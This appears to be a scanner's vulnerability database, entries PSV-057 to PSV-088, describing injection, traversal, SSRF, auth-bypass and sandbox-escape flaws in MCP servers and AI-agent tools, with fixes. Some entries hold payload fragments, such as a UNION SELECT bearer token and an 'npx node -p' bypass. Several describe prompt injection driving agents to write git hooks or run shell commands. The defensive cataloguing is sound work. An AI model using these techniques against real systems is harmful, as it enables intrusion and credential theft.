  { id: "PSV-057", category: "PSV", severity: "BLOCK", title: "GitHub Enterprise Server RCE via X-Stat push option injection (CVE-2026-3854, GHSA-64fw-jx9p-5j24, GHES < 3.14.25/3.15.20/3.16.16/3.17.13/3.18.8/3.19.4)", description: "CVE-2026-3854 (CVSS 8.7, CWE-77, GHSA-64fw-jx9p-5j24) is a remote code execution vulnerability in GitHub Enterprise Server (GHES). During git push, user-supplied push option values are embedded in the internal X-Stat semicolon-delimited header without stripping semicolons. An authenticated attacker with push access can inject three X-Stat fields -- rails_env (sandbox bypass), custom_hooks_dir (hook directory redirect), and repo_pre_receive_hooks (hook entry with path traversal) -- to achieve RCE as the git service user via a single crafted git push command. Fixed in GHES 3.14.25, 3.15.20, 3.16.16, 3.17.13, 3.18.8, 3.19.4, 3.20.0. GitHub.com was patched same-day on March 4, 2026 (no exploitation confirmed). Upgrade self-hosted GHES immediately; 88% of instances remain unpatched as of public disclosure (April 28, 2026).", tags: ["github-enterprise", "cve-2026-3854", "git-push-injection", "x-stat-injection"] },
  { id: "PSV-058", category: "PSV", severity: "BLOCK", title: "Anthropic MCP Inspector unauthenticated RCE via missing client/proxy authentication (CVE-2025-49596, @modelcontextprotocol/inspector < 0.14.1)", description: "CVE-2025-49596 (GHSA-7f8r-222p-6f5g, CVSS 9.4) is a critical unauthenticated RCE vulnerability in Anthropic's official MCP Inspector tool (@modelcontextprotocol/inspector) versions below 0.14.1. The Inspector proxy server lacks authentication between the Inspector client and proxy, allowing any browser tab on the same machine to send arbitrary MCP commands to the proxy via cross-origin requests. An attacker can host a malicious webpage that, when visited by a developer running MCP Inspector, silently spawns MCP servers with attacker-controlled commands and arguments, achieving full RCE. Discovered by Oligo Security and Tenable Research (June 2025). Upgrade to @modelcontextprotocol/inspector >= 0.14.1 immediately. Restrict MCP Inspector to localhost and avoid browsing untrusted sites while Inspector is running.", tags: ["mcp-inspector", "rce", "missing-authentication", "browser-based-attack", "cve-2025-49596"] },
  { id: "PSV-059", category: "PSV", severity: "BLOCK", title: "LiteLLM pre-auth SQL injection via Bearer token (CVE-2026-42208, GHSA-r75f-5x8p-qvmc, actively exploited)", description: "CVE-2026-42208 (GHSA-r75f-5x8p-qvmc, CVSS 9.3) is a critical pre-authentication SQL injection vulnerability in BerriAI LiteLLM versions >= 1.81.16 and < 1.83.7. The Bearer token value in the Authorization header is concatenated directly into a SELECT query against the LiteLLM_VerificationToken table without parameter binding, allowing unauthenticated attackers to inject arbitrary SQL via a crafted Authorization header (e.g., Bearer sk-litellm'<UNION SELECT ...>--). Exploitation was observed in the wild within 36 hours of disclosure (first attempt April 26, 2026 at 16:17 UTC) from IPs 65.111.27.132 and 65.111.25.67 (AS200373, 3xK Tech GmbH, DE). Attackers targeted tables litellm_verificationtoken, litellm_credentials.credential_values, and litellm_config to extract OpenAI organization keys, Anthropic console keys, AWS Bedrock IAM credentials, and other LLM provider API keys. The fix in v1.83.7-stable replaces string interpolation with parameterized queries. Upgrade immediately to LiteLLM >= 1.83.7. If patching is not immediately possible, set disable_error_logs: true under general_settings. Treat any internet-facing instance running 1.81.16–1.83.6 as compromised and rotate all stored LLM provider API keys and cloud credentials.", tags: ["litellm", "sql-injection", "pre-auth", "actively-exploited", "cve-2026-42208", "credential-theft"] },
  { id: "PSV-060", category: "PSV", severity: "BLOCK", title: "WeKnora MCP stdio authenticated command injection (CVE-2026-22688, GHSA-78h3-63c4-5fqc, < 0.2.5)", description: "CVE-2026-22688 (GHSA-78h3-63c4-5fqc, CVSS 9.9 CRITICAL, CWE-77) is a command injection vulnerability in Tencent WeKnora (github.com/Tencent/WeKnora) prior to version 0.2.5. Authenticated users can inject arbitrary values into stdio_config.command and stdio_config.args when transport_type=stdio in the MCP test endpoint; these fields are passed unsanitized to subprocess execution, enabling arbitrary OS command execution. Fixed in 0.2.5. Important: the 0.2.5 patch introduced a new bypass (CVE-2026-30861); upgrade to >= 0.2.10 to remediate both vulnerabilities fully.", tags: ["weknora", "mcp-stdio", "command-injection", "cve-2026-22688", "tencent"] },
  { id: "PSV-061", category: "PSV", severity: "BLOCK", title: "WeKnora MCP stdio unauthenticated npx -p bypass RCE (CVE-2026-30861, GHSA-r55h-3rwj-hcmg, 0.2.5 <= x < 0.2.10)", description: "CVE-2026-30861 (GHSA-r55h-3rwj-hcmg, CVSS 10.0 CRITICAL, CWE-78) is an unauthenticated RCE vulnerability in Tencent WeKnora (github.com/Tencent/WeKnora) versions >= 0.2.5 and < 0.2.10. The 0.2.5 patch for CVE-2026-22688 implemented a command allowlist (npx, uvx) with argument blacklists, but failed to block the -p flag. Attackers can use npx node -p \"<JS payload>\" to evaluate arbitrary JavaScript, enabling full OS command execution. Because WeKnora permits unrestricted user registration, this is exploitable without prior credentials. Upgrade to WeKnora >= 0.2.10 which explicitly blocks -p in allowlist validation.", tags: ["weknora", "mcp-stdio", "command-injection", "unauthenticated", "cve-2026-30861", "tencent"] },
  { id: "PSV-062", category: "PSV", severity: "BLOCK", title: "command-executor-mcp-server OS command injection via allowlist bypass (CVE-2026-7593, <= 0.1.0)", description: "CVE-2026-7593 (CVSS 7.3 HIGH) is an OS command injection vulnerability in Sunwood-ai-labs/command-executor-mcp-server versions <= 0.1.0. The execute_command function in src/index.ts validates input against a command allowlist (git, ls, mkdir, cd, npm, npx, python) but the allowlist can be bypassed to execute arbitrary OS commands. Disclosed publicly May 1, 2026; no patch was available at time of disclosure. Avoid deploying this MCP server on internet-accessible hosts until a patched release is issued.", tags: ["command-executor-mcp-server", "mcp", "command-injection", "cve-2026-7593", "sunwood-ai-labs"] },
  { id: "PSV-063", category: "PSV", severity: "BLOCK", title: "MCP TypeScript SDK cross-client data leak via shared transport instance reuse (CVE-2026-25536, GHSA-345p-7cg4-v4c7, @modelcontextprotocol/sdk 1.10.0-1.25.3)", description: "CVE-2026-25536 (GHSA-345p-7cg4-v4c7, CVSS 7.1 HIGH, CWE-362) is a cross-client data leak vulnerability in the MCP TypeScript SDK (@modelcontextprotocol/sdk) versions 1.10.0 through 1.25.3. When a single McpServer or StreamableHTTPServerTransport instance is reused across multiple concurrent client connections, JSON-RPC message ID collisions cause responses to route to the wrong client, leaking tool execution results, resource data, authentication context, and prompt responses across session boundaries. In multi-tenant or multi-session deployments, an attacker sending overlapping requests can receive another client's data without additional privileges. Upgrade @modelcontextprotocol/sdk to 1.26.0 or later. Ensure fresh McpServer and transport instances are created per request (stateless) or per session (stateful); eliminate global or module-level McpServer/transport assignments.", tags: ["mcp", "typescript-sdk", "cross-client-leak", "cve-2026-25536", "modelcontextprotocol"] },
  { id: "PSV-064", category: "PSV", severity: "BLOCK", title: "create-mcp-server-stdio MCP tool command injection via exec() (CVE-2025-54994, GHSA-3ch2-jxxc-v4xf, @akoskm/create-mcp-server-stdio < 0.0.13, CVSS 9.3)", description: "CVE-2025-54994 (GHSA-3ch2-jxxc-v4xf, CVSS 9.3 Critical, CWE-77/CWE-78) is a command injection vulnerability in @akoskm/create-mcp-server-stdio versions < 0.0.13. The MCP server's built-in which-app-on-port tool concatenates the user-supplied port number into exec('lsof -i :<port>') without sanitization. An attacker who can influence the port argument — via prompt injection targeting an AI agent using this MCP server — can inject shell metacharacters to execute arbitrary OS commands. Disclosed by Liran Tal; highlighted in the OX Security MCP supply chain advisory (April 2026). Upgrade to @akoskm/create-mcp-server-stdio 0.0.13 or later, which replaces exec() with execFile() and argv arrays.", tags: ["mcp", "command-injection", "create-mcp-server-stdio", "cve-2025-54994", "akoskm"] },
  { id: "PSV-065", category: "PSV", severity: "BLOCK", title: "xcode-mcp-server OS command injection via build_project/run_tests (CVE-2026-7416, PolarVista, 1.0.0, CVSS 7.3)", description: "CVE-2026-7416 (CVSS 7.3 HIGH, AV:N/AC:L/PR:N/UI:N) is an OS command injection vulnerability in PolarVista/xcode-mcp-server version 1.0.0. The build_project and run_tests MCP tool handlers in src/index.ts pass the user-supplied Request argument to OS command execution without input sanitization, allowing an attacker to inject arbitrary shell commands via the MCP interface. The vulnerability can be exploited remotely without authentication. No patch was available at time of disclosure (May 1, 2026). Avoid exposing this MCP server to untrusted callers; do not deploy on internet-accessible hosts until a fixed version is released.", tags: ["mcp", "command-injection", "xcode-mcp-server", "cve-2026-7416", "polarvista"] },
  { id: "PSV-066", category: "PSV", severity: "WARN", title: "hwpx-mcp path traversal via output_path in document export tools (CVE-2026-7599, Dayoooun, 0.2.0, CVSS 6.3)", description: "CVE-2026-7599 (CVSS 6.3 MEDIUM, CWE-22) is a path traversal vulnerability in Dayoooun/hwpx-mcp version 0.2.0, an MCP server for working with Korean HWP/HWPX document formats. The save_document, export_to_text, and export_to_html MCP tool handlers in mcp-server/src/index.ts accept a user-supplied output_path parameter without validating or sanitizing it for path traversal sequences (e.g. ../). An attacker can write files to arbitrary locations on the server filesystem by supplying a traversal sequence in output_path. Disclosed publicly May 1, 2026; no patched version was available at time of disclosure. Avoid using this MCP server with untrusted callers or in shared/multi-tenant environments.", tags: ["mcp", "path-traversal", "hwpx-mcp", "cve-2026-7599", "dayoooun"] },
  { id: "PSV-067", category: "PSV", severity: "BLOCK", title: "mcp-atlassian MCPwnfluence — unauthenticated SSRF + arbitrary file write RCE chain (CVE-2026-27825/27826, GHSA-xjgw-4wvw-rgm4, < 0.17.0)", description: "CVE-2026-27825 (GHSA-xjgw-4wvw-rgm4, CVSS 9.1, CWE-22) is a critical arbitrary file write in mcp-atlassian versions before 0.17.0. The confluence_download_attachment MCP tool accepts a download_path parameter without directory confinement, enabling path traversal writes to arbitrary locations (e.g., ~/.ssh/authorized_keys, /etc/cron.d/). CVE-2026-27826 (CVSS 8.2, CWE-918) is a companion SSRF — middleware honors X-Atlassian-Jira-Url and X-Atlassian-Confluence-Url request headers without validation, enabling SSRF to internal hosts. Together (\"MCPwnfluence\", Pluto Security, 2026-02-19), an unauthenticated network-adjacent attacker sends two HTTP requests and achieves full RCE. mcp-atlassian has 4.4K+ stars and 4M+ downloads. Upgrade to mcp-atlassian >= 0.17.0 (fixed 2026-02-24).", tags: ["mcp-atlassian", "ssrf", "arbitrary-file-write", "rce", "unauthenticated", "cve-2026-27825", "cve-2026-27826"] },
  { id: "PSV-068", category: "PSV", severity: "BLOCK", title: "MCP Java SDK DNS rebinding via missing Origin validation (CVE-2026-35568, GHSA-8jxr-pr72-r468, mcp-core < 1.0.0)", description: "CVE-2026-35568 (GHSA-8jxr-pr72-r468, CVSS 7.6, CWE-346) is a DNS rebinding vulnerability in the MCP Java SDK (io.modelcontextprotocol.sdk:mcp-core) prior to version 1.0.0. All versions before 1.0.0 perform no Origin header validation, violating the MCP transport specification. A remote attacker leverages DNS rebinding to make a victim's browser contact a locally-running Java MCP server and invoke any tool call as if they were a locally connected AI agent, enabling unauthorized access to all exposed MCP tools. Fixed in mcp-core 1.0.0 (2026-04-07). Upgrade io.modelcontextprotocol.sdk:mcp-core to >= 1.0.0 immediately.", tags: ["mcp-java-sdk", "dns-rebinding", "origin-validation", "cve-2026-35568"] },
  { id: "PSV-069", category: "PSV", severity: "BLOCK", title: "OpenClaw MCP stdio config env var injection via unsafe cast (GHSA-MJ59-H3Q9-GHFH, < 2026.4.20)", description: "GHSA-MJ59-H3Q9-GHFH is an arbitrary code execution vulnerability in OpenClaw versions prior to 2026.4.20. The resolveStdioMcpServerLaunchConfig function maps the env field from MCP stdio transport workspace configurations using an unsafe generic cast without sanitizing dangerous environment variable keys (e.g., NODE_OPTIONS, LD_PRELOAD). Opening a crafted repository whose workspace config supplies malicious env entries triggers arbitrary code execution on server initialization. This is distinct from CVE-2026-22177 (PSV-050, < 2026.2.21), which targeted the general startup config path; this advisory targets the MCP stdio transport config path specifically. Update to OpenClaw >= 2026.4.20 (fix commit 62fa5071896e95edc7f67d1cebc70a2859e283af, 2026-04-20).", tags: ["openclaw", "env-var-injection", "mcp-stdio", "arbitrary-code-execution"] },
  { id: "PSV-070", category: "PSV", severity: "BLOCK", title: "Oracle MCP Server Helper Tool unauthenticated SQL injection via HTTP (CVE-2026-35228, 1.0.1 - 1.0.156)", description: "CVE-2026-35228 is an easily exploitable SQL injection vulnerability in the Oracle MCP Server Helper Tool (Oracle Open Source Projects), affecting versions 1.0.1 through 1.0.156. An unauthenticated attacker with network access via HTTP can submit crafted requests that cause the tool to execute malicious SQL, potentially leading to unauthorized data access or modification of any database the tool can reach. Update to a version above 1.0.156 per the Oracle Critical Patch Update Advisory (April 2026). As a defense-in-depth measure, restrict HTTP access to the MCP Server Helper Tool to trusted networks, apply WAF rules to filter SQL metacharacters in MCP request parameters, and audit database permissions to enforce least privilege.", tags: ["oracle", "mcp-server", "sql-injection", "cve-2026-35228"] },
  { id: "PSV-071", category: "PSV", severity: "WARN", title: "FastGPT MCP tool endpoint SSRF via stored internal URL (CVE-2026-44284, < 4.14.17)", description: "CVE-2026-44284 (CVSS 6.3) is an SSRF vulnerability in FastGPT prior to version 4.14.17. An authenticated user with permission to create or manage MCP toolsets can save an internal endpoint (e.g. http://localhost:3000/mcp) as an MCP tool URL. The FastGPT backend workflow runner later fetches that stored URL without revalidating the destination, bypassing SSRF protection. This allows pivoting to internal services reachable by the FastGPT backend. Upgrade to FastGPT >= 4.14.17. Additionally, enforce a server-side allowlist of permitted MCP tool endpoint URL prefixes and audit existing MCP toolset configurations for internal-address entries.", tags: ["fastgpt", "ssrf", "mcp-server", "cve-2026-44284"] },
  { id: "PSV-072", category: "PSV", severity: "BLOCK", title: "@yoda.digital/gitlab-mcp-server SSE transport auth bypass and wildcard CORS (CVE-2026-44895, < 0.6.0)", description: "CVE-2026-44895 (CVSS HIGH, CWE-306/CWE-942) is an authentication bypass and permissive CORS vulnerability in @yoda.digital/gitlab-mcp-server < 0.6.0. When USE_SSE=true, the SSE HTTP transport runs with wildcard CORS and no credential check on GET /sse and POST /messages?sessionId=<id>, binding to 0.0.0.0 by default. Any network-adjacent attacker can open an SSE session and send arbitrary MCP tool calls using the server's loaded GITLAB_PERSONAL_ACCESS_TOKEN, gaining full read/write access to all 86 exposed GitLab tools. Upgrade to @yoda.digital/gitlab-mcp-server >= 0.6.0. As a workaround, avoid USE_SSE=true on internet-exposed hosts and bind the server to 127.0.0.1 explicitly.", tags: ["gitlab-mcp", "auth-bypass", "cors", "cve-2026-44895"] },
  { id: "PSV-073", category: "PSV", severity: "BLOCK", title: "@profullstack/mcp-server unauthenticated OS command injection in domain_lookup (GHSA-v6wj-c83f-v46x, <= 1.4.12, no fix)", description: "GHSA-v6wj-c83f-v46x (CVSS 9.8 CRITICAL, CWE-78) is an unauthenticated OS command injection vulnerability in @profullstack/mcp-server <= 1.4.12. The domain_lookup module passes user-supplied arrays directly to execAsync() via shell interpolation (tldx ${keywords.join(' ')}). Shell metacharacters (semicolons, pipes) in the domains or keywords parameters execute arbitrary commands with server process privileges. The server binds to 0.0.0.0 by default with no authentication, enabling remote unauthenticated exploitation. No fix is available as of 2026-05-10. Stop using @profullstack/mcp-server or deploy it behind a strict reverse proxy that rejects input containing shell metacharacters.", tags: ["command-injection", "mcp-server", "ghsa-v6wj-c83f-v46x"] },
  { id: "PSV-074", category: "PSV", severity: "BLOCK", title: "Cline kanban server cross-origin WebSocket hijacking, no Origin validation (CVE-2026-44211, GHSA-5c57-rqjx-35g2, cline <= 2.13.0)", description: "CVE-2026-44211 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H Critical, CWE-1385/CWE-306, GHSA-5c57-rqjx-35g2) is a cross-origin WebSocket hijacking vulnerability in the Cline kanban agent-orchestration feature (cline npm package, all versions up to 2.13.0, no patch as of 2026-05-08 disclosure). The Cline kanban board starts a WebSocket server on 127.0.0.1:3484 with no Origin header validation (CWE-1385). Because browsers do not enforce CORS on WebSocket handshakes, any web page a developer visits while kanban is running can silently connect to :3484 and (1) read real-time workspace data — filesystem paths, task descriptions, git branch names, AI agent chat messages — or (2) inject arbitrary prompts into running Cline/Claude Code/Codex agent sessions, enabling remote code execution. Disclosed by Oasis Security (May 8, 2026). No fix is available. Mitigate by stopping the Cline kanban server when browsing untrusted websites. Monitor github.com/cline/cline for a patched release and upgrade immediately when available.", tags: ["cline", "kanban", "websocket-hijacking", "cve-2026-44211"] },
  { id: "PSV-075", category: "PSV", severity: "INFO", title: "n8n-MCP HTTP transport logs bearer tokens from unauthorized /mcp requests (CVE-2026-41495, n8n-mcp < 2.47.11)", description: "CVE-2026-41495 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N Low, CWE-532) is a sensitive-information-in-log-file vulnerability in czlonkowski/n8n-mcp (npm) prior to version 2.47.11. When n8n-mcp runs in HTTP transport mode, incoming POST /mcp requests have their metadata — bearer tokens, per-tenant API keys, and JSON-RPC payloads — written to server logs regardless of whether authentication succeeds. Unauthenticated requests are correctly rejected with 401, but the rejected request headers containing credentials persist in the log. In deployments with centralized log aggregation, SIEM pipelines, or shared log storage, this exposes authentication tokens to parties outside the request trust boundary. Upgrade to n8n-mcp >= 2.47.11. Until patched, restrict log forwarding scope and audit log access controls to limit exposure of logged credential material.", tags: ["n8n", "n8n-mcp", "information-disclosure", "cve-2026-41495"] },
  { id: "PSV-076", category: "PSV", severity: "WARN", title: "wireshark-mcp arbitrary directory write via unvalidated dest_dir in wireshark_export_objects (CVE-2026-43901, <= 1.1.5, CVSS 6.8)", description: "CVE-2026-43901 (CVSS 6.8 MEDIUM, CWE-22) is a path traversal vulnerability in wireshark-mcp versions 1.1.5 and earlier. The wireshark_export_objects MCP tool accepts an attacker-controlled dest_dir parameter and passes it directly to tshark's --export-objects flag without mandatory path restriction. The _allowed_dirs sandbox defaults to None and only activates when the WIRESHARK_MCP_ALLOWED_DIRS environment variable is explicitly set; in a default installation any filesystem directory is a valid export destination. An MCP client can write tshark-exported protocol objects to arbitrary paths, enabling overwrite of sensitive files, configuration poisoning, or privilege escalation on misconfigured hosts. Disclosed May 11, 2026; no fixed version available. Mitigate by setting WIRESHARK_MCP_ALLOWED_DIRS to a restricted export directory and blocking network access to the MCP server from untrusted callers.", tags: ["mcp", "path-traversal", "wireshark-mcp", "cve-2026-43901"] },
  { id: "PSV-077", category: "PSV", severity: "BLOCK", title: "@mcpc-tech/code-runner-mcp unauthenticated HTTP /mcp endpoint allows RCE (CVE-2026-5029, all versions, no fix)", description: "CVE-2026-5029 is an unauthenticated remote code execution vulnerability in @mcpc-tech/code-runner-mcp (all published versions; no fix available as of May 2026). When started with the --transport http flag the server exposes its /mcp JSON-RPC endpoint on port 3088 without any authentication requirement. Any caller with network access can invoke code-execution tools and run arbitrary code with the privileges of the server process. Do not run code-runner-mcp with --transport http on a network-accessible interface. If HTTP transport is required, bind to loopback only (--host 127.0.0.1) and enforce network-level access control. Reported by CERT Polska, May 2026.", tags: ["mcp", "rce", "code-runner-mcp", "mcpc-tech", "unauthenticated", "cve-2026-5029"] },
  { id: "PSV-078", category: "PSV", severity: "WARN", title: "Apache Doris MCP Server SQL injection (CVE-2025-66335, GHSA-qhfq-gvvc-5q6q, doris-mcp-server < 0.6.1)", description: "CVE-2025-66335 (GHSA-qhfq-gvvc-5q6q, CVSS 5.3, CWE-89) is a SQL injection vulnerability in the Apache Doris MCP Server (PyPI: doris-mcp-server) versions >= 0.1.0 and < 0.6.1. The MCP query execution interface fails to adequately validate and neutralize input parameters before constructing SQL statements, allowing attackers to inject additional SQL syntax that alters query behavior, executes unintended statements, and bypasses access restrictions. Upgrade to doris-mcp-server 0.6.1 or later.", tags: ["mcp", "sql-injection", "apache-doris", "doris-mcp-server", "cve-2025-66335"] },
  { id: "PSV-079", category: "PSV", severity: "WARN", title: "Alibaba Cloud RDS OpenAPI MCP Server unauthenticated RAG tool info disclosure (alibabacloud-rds-openapi-mcp-server, all versions, no fix)", description: "The Alibaba Cloud RDS OpenAPI MCP Server (alibabacloud-rds-openapi-mcp-server) does not authenticate users before invoking the RAG MCP tool. Any client that can reach the MCP endpoint can invoke the RAG tool without credentials, potentially accessing sensitive metadata from the vector index including table names, schema definitions, and database structure. Alibaba declined to patch this vulnerability (classified as \"not applicable\"). All published versions are affected. Mitigate by placing the MCP server behind an authenticating reverse proxy or restricting the endpoint to trusted networks only. Reported by Tomer Peled (Akamai), escalated to CERT/CC, May 2026.", tags: ["mcp", "information-disclosure", "alibaba-cloud", "rds-mcp", "unauthenticated", "no-fix"] },
  { id: "PSV-080", category: "PSV", severity: "BLOCK", title: "Apache Pinot (StarTree) MCP Server SQL injection via auth bypass (mcp-pinot-server, <= 1.1.0)", description: "The Apache Pinot MCP Server (PyPI: mcp-pinot-server, maintained by StarTree at github.com/startreedata/mcp-pinot) versions through 1.1.0 have an authentication bypass that enables SQL injection against the connected Pinot instance. The MCP endpoint does not enforce authentication by default, allowing unauthenticated callers to execute arbitrary Pinot SQL queries — in externally-exposed environments this enables full database takeover. StarTree has added an OAuth option for HTTP transport but SQL injection persists in the code. No CVE assigned as of May 2026. Mitigate by enabling OAuth authentication, restricting the MCP endpoint to loopback or trusted networks, and upgrading to the latest version.", tags: ["mcp", "sql-injection", "auth-bypass", "apache-pinot", "mcp-pinot-server", "startree"] },
  { id: "PSV-081", category: "PSV", severity: "BLOCK", title: "Semantic Kernel Python InMemoryVectorStore eval injection RCE (CVE-2026-26030, < 1.39.4)", description: "CVE-2026-26030 (CWE-95) is a code injection vulnerability in the Microsoft Semantic Kernel Python library prior to 1.39.4. The InMemoryVectorStore default filter function uses unsafe string interpolation with eval() on parameters derived from AI model output. An attacker who can influence model responses can inject Python code and achieve remote code execution on the agent host. Upgrade semantic-kernel to 1.39.4 or later. Until patched, avoid using InMemoryVectorStore with the default filter in adversarial environments, or supply a safe custom filter that does not use eval(). Reported by Microsoft Security Response Center, May 2026.", tags: ["semantic-kernel", "prompt-injection", "rce", "eval-injection", "python", "cve-2026-26030"] },
  { id: "PSV-082", category: "PSV", severity: "BLOCK", title: "Semantic Kernel .NET SessionsPythonPlugin arbitrary file write (CVE-2026-25592, < 1.71.0)", description: "CVE-2026-25592 (CWE-434/CWE-73) is an arbitrary file write vulnerability in the Microsoft Semantic Kernel .NET SDK prior to 1.71.0. The DownloadFileAsync function in SessionsPythonPlugin was inadvertently decorated with [KernelFunction], exposing localFilePath to AI model control without path validation or directory restriction. An attacker can chain ExecuteCode and DownloadFileAsync invocations to write arbitrary files to host startup folders, escaping container sandbox isolation and achieving persistent RCE. Upgrade Microsoft.SemanticKernel to 1.71.0 or later. Until patched, disable or remove SessionsPythonPlugin from production agent configurations. Reported by Microsoft Security Response Center, May 2026.", tags: ["semantic-kernel", "arbitrary-file-write", "sandbox-escape", "rce", "dotnet", "cve-2026-25592"] },
  { id: "PSV-083", category: "PSV", severity: "BLOCK", title: "Google Gemini CLI CI headless folder-trust bypass + --yolo tool-allowlist bypass RCE (GHSA-wpqr-6v78-jr5g, @google/gemini-cli < 0.39.1, CVSS 10.0)", description: "GHSA-wpqr-6v78-jr5g (CVSS 10.0 CRITICAL, CWE-20/CWE-77/CWE-78) is a dual RCE in @google/gemini-cli prior to 0.39.1 (also = 0.40.0-preview.2). (1) Folder Trust Bypass: headless/CI mode automatically trusted workspace folders for loading .env and .gemini/settings.json without user consent, enabling RCE via a malicious config file in any untrusted repository clone. (2) Tool Allowlist Bypass in --yolo mode: fine-grained tool restrictions were silently ignored, enabling prompt-injection-triggered RCE with shell command permissions. Upgrade to 0.39.1 or 0.40.0-preview.3. Do not run gemini-cli in headless/CI mode on untrusted repositories without patching. No CVE assigned as of 2026-05-21.", tags: ["gemini-cli", "google", "folder-trust-bypass", "yolo-mode", "ci-rce", "ghsa-wpqr-6v78-jr5g"] },
  { id: "PSV-084", category: "PSV", severity: "BLOCK", title: "Cursor IDE sandbox escape via .git hook write (CVE-2026-26268, GHSA-8pcm-8jpx-hv8r, CWE-862, < 2.5)", description: "CVE-2026-26268 (GHSA-8pcm-8jpx-hv8r, CVSS 8.1 HIGH, CWE-862) is a sandbox escape in Cursor IDE prior to 2.5. The AI agent sandbox failed to restrict write access to .git configuration files including git hooks (pre-commit, post-checkout, post-merge, etc.). Prompt injection via a malicious repository can instruct the AI agent to write a payload to .git/hooks/pre-commit; the next time the victim runs a git operation that triggers that hook, the payload executes outside the sandbox with full user permissions. Upgrade Cursor to 2.5 or later. The fix adds proper authorization controls preventing sandbox writes to .git directory files.", tags: ["cursor", "git-hooks", "sandbox-escape", "rce", "cve-2026-26268", "ghsa-8pcm-8jpx-hv8r"] },
  { id: "PSV-085", category: "PSV", severity: "BLOCK", title: "PraisonAI legacy API server missing authentication (CVE-2026-44338, GHSA-6rmh-7xcm-cpxj, CWE-306, 2.5.6–4.6.33)", description: "CVE-2026-44338 (GHSA-6rmh-7xcm-cpxj, CVSS 7.3 HIGH, CWE-306/CWE-668/CWE-1188) is a missing-authentication vulnerability in PraisonAI 2.5.6 through 4.6.33. The legacy Flask API server (src/praisonai/api_server.py) hard-codes AUTH_ENABLED = False and AUTH_TOKEN = None; the authentication check always returns True when disabled, so /agents (exposes agent configuration) and /chat (triggers workflow execution) both fail open. Any caller reaching the server can invoke agent workflows, drain LLM API quota, and read outputs without credentials. Deployment templates recommend binding to 0.0.0.0, making this externally exploitable. Active scanning began within 3h44m of disclosure (May 14 2026). Upgrade to praisonai 4.6.34 or later, or set AUTH_ENABLED = True and configure AUTH_TOKEN before deploying.", tags: ["praisonai", "missing-authentication", "ai-agent-framework", "cve-2026-44338", "ghsa-6rmh-7xcm-cpxj"] },
  { id: "PSV-086", category: "PSV", severity: "BLOCK", title: "Cal.com JWT callback authentication bypass — account takeover (CVE-2026-23478, GHSA-7hg4-x4pr-3hrg, CVSS 10.0, 3.1.6–6.0.6)", description: "CVE-2026-23478 (GHSA-7hg4-x4pr-3hrg, CVSS 10.0 Critical, CWE-602/CWE-639) is a critical authentication bypass in Cal.com 3.1.6 through 6.0.6. The custom NextAuth JWT callback accepts identity fields — including email — supplied by the client via session.update() without server-side validation. Because Cal.com uses token.email as the primary database lookup key, any caller can issue session.update({ email: \"victim@example.com\" }) to acquire a JWT for an arbitrary account, enabling full account takeover. AI scheduling agents that connect to a self-hosted Cal.com instance on any 3.1.6–6.0.6 deployment are vulnerable: a prompt injection attack or a compromised MCP client could trigger this bypass to exfiltrate meeting data or impersonate any user. Upgrade Cal.com to 6.0.7 or later and force session invalidation for all existing sessions immediately after patching.", tags: ["calcom", "auth-bypass", "nextauth", "scheduling", "cve-2026-23478", "ghsa-7hg4-x4pr-3hrg"] },
  { id: "PSV-087", category: "PSV", severity: "BLOCK", title: "Starlette BadHost Host-header auth bypass (CVE-2026-48710, GHSA-86qp-5c8j-p5mr, < 1.0.1) — FastAPI/vLLM/LiteLLM/MCP servers affected", description: "CVE-2026-48710 (GHSA-86qp-5c8j-p5mr, PYSEC-2026-161, CVSS 6.5, CWE-444) is an authentication bypass in Starlette versions 0.8.3 through 1.0.0. Starlette reconstructs request.url by concatenating the raw HTTP Host header with the request path without validating the Host value against RFC 9112/RFC 3986 grammar. Authentication middleware that makes access decisions based on request.url.path diverges from the routing engine that uses the raw path scope, allowing an attacker to supply a crafted Host header that makes request.url.path appear to point to an unrestricted route while the actual request targets a protected one. Discovered by X41 D-Sec during an OSTIF-sponsored security audit. Downstream impact is critical: every FastAPI application, vLLM inference server, LiteLLM proxy, and MCP server built on Starlette (approximately 325 million weekly downloads) inherits this auth bypass and can be exploited without credentials to access restricted LLM endpoints, extract API keys, and interact with internal agent tooling. Upgrade Starlette to 1.0.1 or later.", tags: ["badhost", "starlette", "fastapi", "auth-bypass", "cve-2026-48710"] },
  { id: "PSV-088", category: "PSV", severity: "BLOCK", title: "OpenClaw Claw Chain — sandbox escape, credential read, heredoc bypass, owner impersonation (CVE-2026-44112/44113/44115/44118, < 2026.4.22)", description: "CVE-2026-44112 (CVSS 9.6, CWE-367), CVE-2026-44113 (CVSS 7.7, CWE-367), CVE-2026-44115 (CVSS 8.8, CWE-184), and CVE-2026-44118 (CVSS 7.8, CWE-284) are four chainable vulnerabilities in OpenClaw prior to version 2026.4.22, collectively dubbed Claw Chain by Cyera Research. CVE-2026-44112/44113 exploit TOCTOU race conditions in the OpenShell managed sandbox backend to escape the sandbox mount root (write and read respectively). CVE-2026-44115 allows shell expansion tokens embedded in heredoc bodies to bypass the OpenShell allowlist, executing disallowed commands. CVE-2026-44118 exposes an improper access control flaw where the loopback gateway trusts a client-controlled flag (senderIsOwner) without validating it against the authenticated session, allowing any loopback client to impersonate the owner and gain control over gateway configuration, cron scheduling, and execution environment. The full attack chain — read sensitive files (CVE-2026-44113/44115), escalate privileges (CVE-2026-44118), establish persistence (CVE-2026-44112) — can be executed by any authenticated agent process. Approximately 245,000 exposed instances were identified via Shodan/ZoomEye as of May 2026. Upgrade OpenClaw to 2026.4.22 or later immediately.", tags: ["openclaw", "openShell", "sandbox-escape", "toctou", "cve-2026-44112", "cve-2026-44113", "cve-2026-44115", "cve-2026-44118", "claw-chain"] },
